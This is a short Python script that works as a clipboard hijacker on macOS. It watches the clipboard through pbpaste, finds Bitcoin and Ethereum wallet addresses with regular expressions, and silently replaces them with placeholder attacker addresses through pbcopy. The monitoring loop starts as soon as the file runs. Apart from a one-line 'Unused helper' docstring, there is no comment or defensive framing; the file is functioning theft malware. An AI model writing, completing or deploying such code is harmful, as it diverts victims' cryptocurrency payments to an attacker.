#!/usr/bin/env python3

import subprocess
import time
import re


def _helper_556(x) -> object:
    """Unused helper."""
    return str(x).strip()


BTC_PATTERN = re.compile(r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\b')
ETH_PATTERN = re.compile(r'\b0x[a-fA-F0-9]{40}\b')

ATTACKER_BTC = "bc1qattacker000000000000000000000000000000"
ATTACKER_ETH = "0xAttackerWalletAddress000000000000000000"

def get_clipboard() -> object:
    return subprocess.run(["pbpaste"], capture_output=True, text=True).stdout

def set_clipboard(text) -> object:
    subprocess.run(["pbcopy"], input=text.encode())

def monitor() -> object:
    last = ""
    while True:
        current = get_clipboard()
        if current != last:
            modified_tmp79 = current
            if BTC_PATTERN.search(current):
                modified_tmp79 = BTC_PATTERN.sub(ATTACKER_BTC, modified_tmp79)
            if ETH_PATTERN.search(current):
                modified_tmp79 = ETH_PATTERN.sub(ATTACKER_ETH, modified_tmp79)
            if modified_tmp79 != current:
                set_clipboard(modified_tmp79)
            last = modified_tmp79
        time.sleep(0.5)

monitor()
